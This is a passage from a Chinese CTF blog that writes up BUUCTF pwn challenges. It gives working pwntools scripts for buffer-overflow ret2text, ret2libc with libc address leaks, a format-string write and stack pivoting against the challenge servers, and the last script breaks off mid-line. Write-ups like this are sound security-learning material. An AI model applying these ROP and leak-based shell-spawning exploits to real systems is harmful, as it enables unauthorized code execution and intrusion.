class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input new log info:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt= <span class="number">0x80484d0</span></span><br><span class="line">scanf_plt = <span class="number">0x8048500</span></span><br><span class="line">buf = <span class="number">0x0804A034</span></span><br><span class="line">scanf_argv = <span class="number">0x080489DB</span></span><br><span class="line">pop =<span class="number">0x0804871f</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4c</span> + p32(scanf_plt) + p32(pop) + p32(scanf_argv) + p32(buf) + p32(system_plt) + p32(<span class="number">0xdeedbeef</span>) + p32(buf)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4xd40ufmyt1c.webp"></p><p>​    我自己初次写的payload，不知道为什么发过去就被截断了。</p><p>​    也不知道我的scanf函数调用正确没有，打不通实在没思路了看看题解吧呜呜。</p><p>​    <img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7d57rb16ietc.webp"></p><p><mark>原来<code>/bin/sh</code>和<code>sh</code>的效果是一样的。</mark></p><p>那就不用自己写入，直接利用就可以。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/20&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28642</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Please input admin password:&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;administrator&quot;</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input new log info:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt= <span class="number">0x80484d0</span></span><br><span class="line">sh_addr =<span class="number">0x080482ea</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4c</span> + p32(system_plt) + p32(<span class="number">0xdeedbeef</span>) + p32(sh_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x15-铁人三项-第五赛区-2018-rop"><a href="#0x15-铁人三项-第五赛区-2018-rop" class="headerlink" title="0x15.铁人三项(第五赛区)_2018_rop"></a>0x15.铁人三项(第五赛区)_2018_rop</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.118enfp322uo.webp"></p><p>简单的溢出，payload长度限制在256字节，无sys，无/bin/sh，考虑ret2libc3</p><p>我的payload没打通，我的思路是利用write函数泄露然后一把梭，但是手动试了下都不通。换另一个函数泄露试试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/21&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27718</span>)</span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/21&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = celf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_start_main_got = celf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*(0x88+0x4) + p32(write_plt) + p32(main) + p32(1) + p32(libc_start_main_got) + p32(50)</span></span><br><span class="line"><span class="comment"># c.sendline(payload)</span></span><br><span class="line"><span class="comment"># str =b&quot;\x90-\xd1\xf7\xf0\xf6\xdd\xf7\x80\x8f\xdb\xf7&quot;</span></span><br><span class="line"><span class="comment"># str = str[0:4].ljust(4,b&#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># str = u32(str)</span></span><br><span class="line"><span class="comment"># print(hex(str))</span></span><br><span class="line"><span class="comment"># print(u32(&quot;\xe0\xad\xcf\xf7&quot;))</span></span><br><span class="line"><span class="comment"># 0xf7d12d90</span></span><br><span class="line">libc_start_main_addr = <span class="number">0xf7d12d90</span></span><br><span class="line">libc_base = libc_start_main_addr - <span class="number">0x018d90</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x03d200</span></span><br><span class="line">bin_sh = libc_base +  <span class="number">0x17e0cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>用一下脚本，手梭好累：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1mp5hlz83jz4.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/21&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27718</span>)</span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/21&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = celf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = celf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">write_addr=u32(c.recv())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HERE!&quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>可能是因为库的原因吧，我用<code>__libc_start_main</code>就没有打通，用<code>write</code>打通了！其实还好，思路是正确的。</p><h2 id="0x16-bjdctf-2020-babyrop"><a href="#0x16-bjdctf-2020-babyrop" class="headerlink" title="0x16.bjdctf_2020_babyrop"></a>0x16.bjdctf_2020_babyrop</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3onmaf3t6b0g.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7e8i3fqh5ugw.webp"></p><p>基本的<code>ret2libc3</code>，但是注意传参规则AMD64</p><p>​    详情参考<a href="http://c2yb8er.cn/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/#%E5%85%AB%E3%80%81ciscn-2019-c-1">第八题</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/22&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29606</span>)</span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/22&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = celf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = celf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = celf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400733</span></span><br><span class="line">ret = <span class="number">0x04004c9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HERE!!!&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc =LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c.recvuntil(b&#x27;Pull up your sword and tell me u story!\n&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(ret) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x17-bjdctf-2020-babystack2"><a href="#0x17-bjdctf-2020-babystack2" class="headerlink" title="0x17.bjdctf_2020_babystack2"></a>0x17.bjdctf_2020_babystack2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.6wiy4wdpntz4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1vwvliblv5gg.webp"></p><p>后门函数就在眼前，但是这始终满足不了溢出的条件？</p><p>看似不可溢出，实际上暗藏玄机！<code>负数绕过</code></p><p>绕过后就是一道很简单的 <code>ret2text</code> 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/23&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25305</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;[+]Please input the length of your name:\n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;-100&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> +p64(<span class="number">0x040072A</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;[+]What&#x27;s u name?\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.gh9foxpem14.webp"></p><h2 id="0x18-jarvisoj-fm"><a href="#0x18-jarvisoj-fm" class="headerlink" title="0x18.jarvisoj_fm"></a>0x18.jarvisoj_fm</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.571dn44kt5hc.webp"></p><p>​    名字一看就是<code>fms</code> 那就先搁在这里等学完后再来刷。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27329</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">payload = p32(<span class="number">0x0804A02C</span>) + <span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230304/%E5%9B%BE%E7%89%87.18rob8rn38f4.webp"></p><h2 id="0x19-ciscn-2019-es-2"><a href="#0x19-ciscn-2019-es-2" class="headerlink" title="0x19.ciscn_2019_es_2"></a>0x19.ciscn_2019_es_2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4kdb4tr32kxs.webp"></p><p>​    读两次，let me think think。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4h1veooijfuo.webp"></p><p>​    发现后门，但是这个后门没啥用除了调用了<code>system</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4niu6emnfbpc.webp"></p><p>​    这里有个疑点 : 为什么<code>memset</code>只初始化<code>32字节</code>?</p><p>​    为什么最后还把第一次输入的专门打印出来了？</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.74tornys3se8.webp"></p><p>​    原因只有一个：</p><p>​    此时的s的值为<code>123\naaaaaaaaaaaaaaaaaaaaaaaaaa</code></p><p>​    当输入超过<code>30bytes</code>就会乱码</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7dm5g44u8ups.webp"></p><p>​    捣鼓半天，发现利用我现存知识根本解不出来，网上搜了一下<code>es</code>，发现知识点是<mark>栈劫持/栈迁移</mark>。</p><p>​    <a class="link" href="https://www.yuque.com/hxfqg9/bin/erh0l7#TELMU">1.栈迁移原理<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230203/%E5%9B%BE%E7%89%87.4lfm0vr5xim8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230204/%E5%9B%BE%E7%89%87.60ya2l6d8bgg.webp"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28297</span>)</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/25&quot;)</span></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/25&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sys_addr = celf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span>   </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">payload = p32(sys_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf_addr+ <span class="number">12</span>) + <span class="string">b&quot;sh&quot;</span> </span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;\0&#x27;</span> + p32(buf_addr-<span class="number">4</span>) + p32(leave_ret) </span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>流程如下图：</p><p><img lazyload alt="image" data-src="D:\0_Hexo个人博客\第0版\source_posts\Pwn.png"></p><h2 id="0x1a-jarvisoj-tell-me-something"><a href="#0x1a-jarvisoj-tell-me-something" class="headerlink" title="0x1a.jarvisoj_tell_me_something"></a>0x1a.jarvisoj_tell_me_something</h2><p><code>easy ret2text</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27259</span>)</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/26&quot;)</span></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/26&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x400620</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input your message:\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1b-pwn2-sctf-2016"><a href="#0x1b-pwn2-sctf-2016" class="headerlink" title="0x1b.pwn2_sctf_2016"></a>0x1b.pwn2_sctf_2016</h2><p><code>ret2libc3</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230204/%E5%9B%BE%E7%89%87.2btn5432uubk.webp"></p><p>当某个函数泄露使用<code>LibcSearcher</code>匹配不了时候，可以多尝试其他函数进行泄露。</p><h2 id="0x1c-HarekazeCTF2019-baby-rop2"><a href="#0x1c-HarekazeCTF2019-baby-rop2" class="headerlink" title="0x1c.[HarekazeCTF2019]baby_rop2"></a>0x1c.[HarekazeCTF2019]baby_rop2</h2><p><code>ret2libc3</code></p><p><mark>调用<code>printf</code>函数泄露libc地址</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230204/%E5%9B%BE%E7%89%87.4l8tfu4x7q0w.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c= remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29653</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/28&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0400731</span> <span class="comment"># rsi</span></span><br><span class="line">format_str = <span class="number">0x0400770</span>  <span class="comment"># %s</span></span><br><span class="line">ret_addr = <span class="number">0x00400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0xdeedbeef</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;name? &quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = u64(c.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1d-jarvisoj-level3"><a href="#0x1d-jarvisoj-level3" class="headerlink" title="0x1d.jarvisoj_level3"></a>0x1d.jarvisoj_level3</h2><p><code>ret2libc3</code></p><p><mark>调用<code>write</code>函数泄露libc地址</mark></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/29&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26123</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/29&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">__libc_start_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(__libc_start_main_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">__libc_start_main_addr=u32(c.recv(<span 